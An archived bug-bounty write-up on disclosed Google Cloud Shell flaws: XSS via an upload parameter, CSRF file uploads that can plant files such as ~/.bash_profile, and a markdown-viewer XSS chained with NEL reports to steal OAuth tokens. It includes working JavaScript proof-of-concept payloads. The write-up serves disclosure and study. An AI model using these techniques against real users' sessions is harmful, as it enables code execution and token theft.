---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-12-26_gcp-2022-few-bugs-in-the-google-cloud-shell.md
original_filename: 2022-12-26_gcp-2022-few-bugs-in-the-google-cloud-shell.md
title: '[ GCP 2022 ] Few bugs in the google cloud shell'
category: documents
detected_topics:
- xss
- cloud-security
- oauth
- access-control
- command-injection
- file-upload
tags:
- imported
- documents
- xss
- cloud-security
- oauth
- access-control
- command-injection
- file-upload
language: en
raw_sha256: 42f392d32b14cf158fdec02615bc802627f56fbae3e799c67f46af2e4fca0f4b
text_sha256: 25039f44274490b7d5e2f1e028fabae04e998f0bfa27ff8afb442873667f8ad7
ingested_at: '2026-06-28T07:32:16Z'
sensitivity: unknown
redactions_applied: false
---

# [ GCP 2022 ] Few bugs in the google cloud shell

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-12-26_gcp-2022-few-bugs-in-the-google-cloud-shell.md
- Source Type: markdown
- Detected Topics: xss, cloud-security, oauth, access-control, command-injection, file-upload
- Ingested At: 2026-06-28T07:32:16Z
- Redactions Applied: False
- Raw SHA256: `42f392d32b14cf158fdec02615bc802627f56fbae3e799c67f46af2e4fca0f4b`
- Text SHA256: `25039f44274490b7d5e2f1e028fabae04e998f0bfa27ff8afb442873667f8ad7`


## Content

---
title: "[ GCP 2022 ] Few bugs in the google cloud shell"
page_title: "Obmi's blog: [ GCP 2022 ] Few bugs in the google cloud shell"
url: "https://obmiblog.blogspot.com/2022/12/gcp-2022-few-bugs-in-google-cloud-shell.html"
final_url: "https://obmiblog.blogspot.com/2022/12/gcp-2022-few-bugs-in-google-cloud-shell.html"
authors: ["Obmi"]
programs: ["Google"]
bugs: ["CSRF", "Stored XSS", "File upload", "OAuth"]
bounty: "20,000"
publication_date: "2022-12-26"
added_date: "2023-07-12"
source: "pentester.land/writeups.json"
original_index: 1729
---

### What is Google Cloud Shell.

Cloud Shell is an interactive shell environment for Google Cloud that lets you learn and experiment with Google Cloud and manage your projects and resources from your web browser.

### 1\. XSS via `uri` parameter in file uploading feature

**  
**

**Endpoint:**  _POST https://970-cs- <ID>-default.cs-europe-west4-fycr.cloudshell.dev/file-upload_

**Issue** : _214291117_  
**Bounty** : _5k_

  

###  Description:

When a file uploaded the server return the unescaped `uri` parameter value in the response body. But this response has '_text/html_ ' value in the content-type header, so this response will be interpreted as a usual html document by browser if user will see it (see screenshot/video). Attacker can load file from his own origin via form and user will see that response.

####  

#### Code (javascript):

> function send(devshell_host, target='_blank') {

> > if(!devshell_host) return alert('Devshell host is empty')
>
>> let form = document.createElement('form');
>
>> form.action = `https://${devshell_host}/file-upload?`
>
>> form.target = target
>
>> form.method = 'POST'
>
>> form.enctype = 'multipart/form-data'
>
>> /* ADD PAYLOAD TO PATH */
>
>> let uriInput = document.createElement('input')
>
>> uriInput.name = 'uri'
>
>> uriInput.value = `/tmp/test<img/src/onerror=alert(document.domain);${Math.floor(Math.random() * 1000) }>`
>
>> /* ADD UPLOAD FILE */
>
>> let fileInput = document.createElement('input')
>
>> fileInput.type = 'file'
>
>> fileInput.name = 'file'
>
>> let file = new File(['somecontent'], "img.jpg",{type:"image/jpeg", lastModified:new Date().getTime()});
>
>> let container = new DataTransfer();
>
>> container.items.add(file);
>
>> fileInput.files = container.files;
>
>> /* BUILD FORM */
>
>> form.replaceChildren(uriInput, fileInput)
>
>> document.body.append(form)
>
>> /* SEND */
>
>> form.submit()

> }

> send('your-domain')

#### Screenshot: 

[![XSS cloud shell](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiCGnFx2x9XwByebnlewnbicGvWAqaNG2ZeYtLID9JKM9PA4m6br5pP7FTZ7lUTn5R9gVIU-kNtTyVMmFYRDE5NatpmfUxwFkg9SHWcWhj7Scz7QO_xvEr3AGLF0YJHLFd1-NM51dsfQgQl_FRaGGCdpnE5MNsp9MQuRBcxz33nNyiG3Rd5mjN4WddKWQ/w320-h160/DEVSHELL_XSS_FILE_UPLOAD.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiCGnFx2x9XwByebnlewnbicGvWAqaNG2ZeYtLID9JKM9PA4m6br5pP7FTZ7lUTn5R9gVIU-kNtTyVMmFYRDE5NatpmfUxwFkg9SHWcWhj7Scz7QO_xvEr3AGLF0YJHLFd1-NM51dsfQgQl_FRaGGCdpnE5MNsp9MQuRBcxz33nNyiG3Rd5mjN4WddKWQ/s1919/DEVSHELL_XSS_FILE_UPLOAD.png)

  

#### Video:

  
  

### 2\. CSRF File uploading

  
**Endpoints** :  

  * _POST https://970-cs- <ID>-default.cs-europe-west4-fycr.cloudshell.dev/_cloudshell/file?path=..._
  * _POST https://970-cs- <ID>-default.cs-europe-west4-fycr.cloudshell.dev/file-upload_

**Issue:** _214035061_

**Bounty:** _5k + 5k (another endpoint and re-attack after fix)_

_  
_

#### Description:

User can upload files to his cloud shell via two endpoints:  

  * POST https://8080-cs-<ID>-default.cs-europe-west4-fycr.cloudshell.dev/_cloudshell/file?path=<DIRECTORY>
  * POST https://970-cs-<ID>-default.cs-europe-west4-fycr.cloudshell.dev/file-upload

Both of them were vulnerable to CSRF and had no any protection of csrf. It makes possible to send POST request with file from any third-party origin (attacker's origin) to the user's vm origin (victim origin). If some file will be uploaded to `~/.bash_profile` path (for example) this file will be stored for a long time and will be executed every time when user login in his vm.

Also this csrf can be used for xss if attacker will upload a file with payload to the "/google/devshell/editor/theia/lib/" path.

  

####  Example of code:

> function uploadBashPayload(hostname){  
>  let formData = new FormData()  
>  let file = new Blob(['some evil content'], {type : 'text/plain'});  
>  formData.append('uploadFile', file, '<your-filepath>')  
>  fetch(`https://${hostname}/_cloudshell/file?path=`, { credentials: 'include', method: 'POST', body: formData } )  
>  }

  

#### Example of code 2:

> function uploadXSSPayload(hostname){  
>  let winname = 'evilwindow'  
>  let win = window.open('about:blank', winname)  
>  let filename = `test${Math.floor(Math.random() * 1000) }.html`  
>  if(!hostname) return alert('Devshell host is empty')  
>  let form = document.createElement('form');  
>  form.action = `https://${hostname}/file-upload?`  
>  form.target = winname  
>  form.method = 'POST'  
>  form.enctype = 'multipart/form-data'  
>  /* ADD PAYLOAD IN PATH */  
>  let uriInput = document.createElement('input')  
>  uriInput.name = 'uri'  
>  uriInput.value = `/google/devshell/editor/theia/lib/${filename}`  
>  /* ADD UPLOAD FILE */  
>  let fileInput = document.createElement('input')  
>  fileInput.type = 'file'  
>  fileInput.name = 'file'  
>  let file = new File(['<html><head><script>alert(`I am xss in: \$\\{ origin \\} origin`)</script></head><body>Hey! Iam attacker page</body></html>'], filename,{type:"image/jpeg", lastModified:new Date().getTime()});  
>  let container = new DataTransfer();  
>  container.items.add(file);  
>  fileInput.files = container.files;  
>  /* BUILD FORM */  
>  form.replaceChildren(uriInput, fileInput)  
>  document.body.append(form)  
>  /* SEND */  
>  form.submit()  
>  setTimeout( ()=>{ win.location = `https://${hostname}/${filename}` }, 1500)  
>  }

  
  

#### Video:

  
  

### 3\. Stored XSS in Markdown Viewer and oauth token hijacking

  
**Issue:** 217090716  
**Bounty:** 5K  
  

####  XSS via markdown part

  1. When a markdown document is opened in /webview the child frame with the rendered markdown document has CSP for prevent javascript execution, but it allows to redirect the current frame to any other origin via `<meta http-equiv="refresh" content="0;url=//evil-url">` tag.
  2. The `/webview/index.html` frame listens messages from child frame and doesn't check origin of message. So the attacker's iframe can can send commands to the parent frame.
  3. In the `/webview/main.js` the function `getVsCodeApiScript` generates inline javascript for child frame and use the unsafe 'state' param inside script content, this param can be received from any child frame via `postMessage()`. It doesnt sanitizing the state param and it used in the script tag content. If the state param contains string '</script><script>evil' - browser will parse it as two different <script> nodes and will add them to the head of page ( before the csp meta tags will be added).
  4. So attacker can place any javascript inside the state param and send it to the parent frame via `parent.parent.postMessage()`.

#### Token hijacking with NEL

  1. If attacker can get control of victim VM (through xss, csrf, etc) he can run his own webserver instead of original devshell server and configure it to send NEL reports to the attacker's report-uri.
  2. Browser will store attacker's _'report-uri'_ endpoint to use it for sending all network error reports what will thrown in user's devshell origin.
  3. Every time, when user starts new devshell session, browser sends many authorization requests to the VM origin with oauth token in url. Because the devshell not started yet server responds with 503 http code. It's the network error, so browser will send a report.
  4. Browser will send NEL reports, what contains urls with tokens to the attacker server. So, that way can be used to permanent stealing of user's token. More details about NEL you can read here: <https://web.dev/network-error-logging/>

#### Video: 

  

  

Thanks for reading
